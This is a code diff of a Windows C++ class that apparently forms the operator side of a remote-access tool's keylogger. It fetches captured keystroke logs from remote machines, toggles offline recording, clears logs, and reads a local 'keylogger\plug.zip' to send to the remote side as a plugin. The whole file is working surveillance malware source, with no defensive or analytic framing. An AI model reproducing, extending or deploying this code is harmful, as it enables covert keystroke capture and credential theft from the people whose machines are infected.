@@ -3,8 +3,8 @@
 #include "KeybdLogDlg.h"
 
 
-CKeybdLogSrv::CKeybdLogSrv(DWORD dwIdentity):
-CEventHandler(dwIdentity)
+CKeybdLogSrv::CKeybdLogSrv(CManager*pManager) :
+	CMsgHandler(pManager)
 {
 	m_pDlg = NULL;
 }
@@ -22,54 +22,110 @@ void CKeybdLogSrv::OnClose(){
 	}
 }
 
-void CKeybdLogSrv::OnConnect(){
+void CKeybdLogSrv::OnOpen(){
 	m_pDlg = new CKeybdLogDlg(this);
 	if (FALSE == m_pDlg->Create(IDD_KBD_LOG, CWnd::GetDesktopWindow())){
-		Disconnect();
+		Close();
 		return;
 	}
 	m_pDlg->ShowWindow(SW_SHOW);
 }
 
-void CKeybdLogSrv::OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer){
-	switch (Event)
+void CKeybdLogSrv::OnGetPlug(){
+	//
+	TCHAR plugPath[MAX_PATH];
+	GetModuleFileName(GetModuleHandle(0), plugPath, MAX_PATH);
+	TCHAR * p = plugPath + lstrlen(plugPath) - 1;
+	while (p >= plugPath && *p != '\\') --p;
+	ASSERT(p >= plugPath);
+	*p = NULL;
+
+	CString FileName(plugPath);
+	FileName += "\\keylogger\\plug.zip";
+
+	DWORD dwFileSizeLow = NULL;
+	LPVOID lpBuffer = NULL;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	DWORD dwRead = 0;
+
+	hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
+		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if (hFile == INVALID_HANDLE_VALUE){
+		::MessageBox(NULL, TEXT("CKeybdLogSrv::OnGetPlug CreateFile Failed"),
+			TEXT("Error"), MB_OK);
+		return;
+	}
+
+	dwFileSizeLow = GetFileSize(hFile, NULL);
+	lpBuffer = VirtualAlloc(NULL, dwFileSizeLow, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (lpBuffer && ReadFile(hFile, lpBuffer, dwFileSizeLow, &dwRead, NULL) &&
+		dwRead == dwFileSizeLow){
+		SendMsg(KEYBD_LOG_PLUGS, (char*)lpBuffer, dwRead);
+	}
+	else{
+		::MessageBox(NULL, TEXT("CKeybdLogSrv::OnGetPlug ReadFile Failed")
+			, TEXT("Error"), MB_OK);
+	}
+
+	if (lpBuffer){
+		VirtualFree(lpBuffer, dwFileSizeLow, MEM_RELEASE);
+		lpBuffer = NULL;
+	}
+	CloseHandle(hFile);
+}
+
+
+void CKeybdLogSrv::OnReadMsg(WORD Msg,  DWORD dwSize, char*Buffer){
+	switch (Msg)
 	{
 	case KEYBD_LOG_ERROR:
 		OnLogError((wchar_t*)Buffer);
 		break;
-	case KEYBD_LOG_DATA:
-		OnLogData(Buffer);
+	case KEYBD_LOG_DATA_APPEND:
+		OnLogData(Buffer,TRUE);
+		break;
+	case KEYBD_LOG_DATA_NEW:
+		OnLogData(Buffer, FALSE);
 		break;
 	case KEYBD_LOG_INITINFO:
 		OnLogInit(Buffer);
+		break;
+	case KEYBD_LOG_GETPLUGS:
+		OnGetPlug();
+		break;
 	default:
 		break;
 	}
 }
 
 //数据到来
-void CKeybdLogSrv::OnLogData(char*szLog){
-	m_pDlg->SendMessage(WM_KEYBD_LOG_DATA, (WPARAM)szLog, 0);
+void CKeybdLogSrv::OnLogData(char*szLog,BOOL Append){
+	m_pDlg->SendMessage(WM_KEYBD_LOG_DATA, (WPARAM)szLog, Append);
 }
 
 //获取日志
 void CKeybdLogSrv::GetLogData(){
-	Send(KEYBD_LOG_GET_LOG, 0, 0);
+	SendMsg(KEYBD_LOG_GET_LOG, 0, 0);
 }
 //离线记录
 void CKeybdLogSrv::SetOfflineRecord(BOOL bOfflineRecord)
 {
-	Send(KEYBD_LOG_SETOFFLINERCD, (char*)&bOfflineRecord, 1);
+	SendMsg(KEYBD_LOG_SETOFFLINERCD, (char*)&bOfflineRecord, 1);
 }
 
 //
 void CKeybdLogSrv::OnLogError(wchar_t*szError){
 	m_pDlg->SendMessage(WM_KEYBD_LOG_ERROR, (WPARAM)(szError), 0);
-	Disconnect();
+	Close();
 }
 
 void CKeybdLogSrv::OnLogInit(char*InitInfo)
 {
 	bool bOfflineRecord = InitInfo[0];
 	m_pDlg->SendMessage(WM_KEYBD_LOG_INIT, bOfflineRecord, 0);
+}
+
+void CKeybdLogSrv::CleanLog(){
+	SendMsg(KEYBD_LOG_CLEAN, 0, 0);
 }
